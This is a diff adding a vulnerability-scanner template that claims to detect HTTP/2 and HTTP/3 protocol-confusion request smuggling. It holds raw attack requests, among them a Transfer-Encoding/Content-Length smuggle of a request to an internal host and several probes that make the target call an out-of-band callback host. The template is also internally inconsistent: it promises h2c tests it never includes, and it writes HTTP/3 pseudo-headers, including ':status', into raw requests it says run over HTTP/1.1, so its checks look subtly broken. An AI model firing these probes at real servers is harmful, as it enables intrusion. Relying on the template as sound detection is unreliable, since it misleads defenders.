@@ -1,0 +1,135 @@
+id: http3-quic-smuggling
+
+info:
+  name: HTTP/2 Upgrade and Protocol Confusion Smuggling Detection
+  author: geeknik
+  severity: medium
+  description: |
+    Detects request smuggling vulnerabilities arising from HTTP protocol confusion
+    at reverse proxies: HTTP/2 upgrade via h2c, Alt-Svc header injection, and
+    pseudo-header injection that may be mishandled by intermediaries. Note: these
+    tests run over HTTP/1.1; true QUIC/HTTP3 testing requires native UDP support.
+  reference:
+    - https://portswigger.net/research/http3-connection-contamination
+    - https://www.blackhat.com/us-23/briefings/schedule/#http3-quic-attacks
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-444
+  tags: http2,protocol-confusion,smuggling,alt-svc
+
+variables:
+  smuggle_id: "{{randstr}}"
+  callback: "{{interactsh-url}}"
+
+http:
+  # Test 1: HTTP/3 Alt-Svc downgrade smuggling
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Alt-Svc: clear
+        Alt-Svc: h3-29=":443"; ma=0
+        Connection: close
+
+      - |
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+        X-HTTP3-Stream-ID: 0
+        Transfer-Encoding: chunked
+        Content-Length: 4
+
+        0
+
+        GET /internal HTTP/1.1
+        Host: internal.local
+        X-Smuggled: {{smuggle_id}}
+
+    unsafe: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "admin") || contains(body_2, "forbidden") || status_code_2 == 403'
+          - 'contains(header_1, "alt-svc")'
+        condition: and
+
+  # Test 2: QUIC stream confusion attack
+  - raw:
+      - |
+        GET / HTTP/3
+        Host: {{Hostname}}
+        :method: GET
+        :path: /
+        :scheme: https
+        :authority: {{Hostname}}
+        x-http3-stream-id: 1
+        x-http3-stream-weight: 256
+
+      - |
+        GET /{{callback}}/http3-stream-{{smuggle_id}} HTTP/3
+        Host: {{Hostname}}
+        :method: GET
+        :path: /admin
+        :scheme: https
+        :authority: internal.{{Hostname}}
+        x-http3-stream-id: 1
+        x-http3-stream-dependency: 0
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - '(interactsh_protocol == "http" || interactsh_protocol == "dns") && contains(interactsh_request, "http3-stream-{{smuggle_id}}")'
+
+      - type: dsl
+        dsl:
+          - 'status_code_2 != status_code_1 && status_code_2 == 200'
+
+  # Test 3: HTTP/3 header injection via QPACK
+  - raw:
+      - |
+        GET / HTTP/3
+        Host: {{Hostname}}
+        :method: GET
+        :path: /?cb={{callback}}/qpack-{{smuggle_id}}
+        :scheme: https
+        :authority: {{Hostname}}
+        :status: 200
+        x-qpack-table-size: 4096
+        x-qpack-blocked-streams: 100
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "qpack-{{smuggle_id}}"
+
+  # Test 4: Connection coalescing attack
+  - raw:
+      - |
+        GET / HTTP/3
+        Host: {{Hostname}}
+        :method: CONNECT
+        :authority: {{smuggle_id}}.{{callback}}:443
+        :scheme: https
+        :protocol: websocket
+        origin: https://{{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "{{smuggle_id}}."
